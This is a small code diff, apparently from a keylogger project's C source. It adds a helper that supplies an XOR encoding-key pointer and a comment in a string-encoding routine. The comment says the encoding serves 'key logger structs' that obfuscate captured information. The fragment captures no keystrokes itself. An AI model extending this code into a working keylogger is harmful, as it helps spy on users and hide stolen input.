@@ -5,6 +5,21 @@
 
 
 /**
+ * This code may look weird, however, my encoding function takes a pointer
+ * to an unsigned character that is the encoding key, this allows key logger structs
+ * to maintain a stateful encoding key to encode many pieces of infomation. However,
+ * this also means if we want to encode information outside the keylogger we need 
+ * a valid pointer a key! Hence the use of the global unsigned char whose value 
+ * we can set to the key and whose address we can reference!
+ */
+static unsigned char __ENODING_KEY_POINTER__;
+unsigned char* freshEncodingKeyPtr(unsigned char key) {
+    __ENODING_KEY_POINTER__ = key;
+    return &__ENODING_KEY_POINTER__;
+}
+
+
+/**
  * Given a string pointer, iterate through each character and XOR it with 
  * the encoding key. If the current character is the key, or the key is the 
  * null terminator then simply leave the char as is. Then rotate the
@@ -13,6 +28,7 @@
 void encode(char* str, unsigned char* encKey) {
     char* s  = str;
     while (*s != '\0') {
+        // don't encode chars that match the key or if key is 0
         if (*s != *encKey && *encKey != 0x0) {
             *s ^= *encKey;
         }
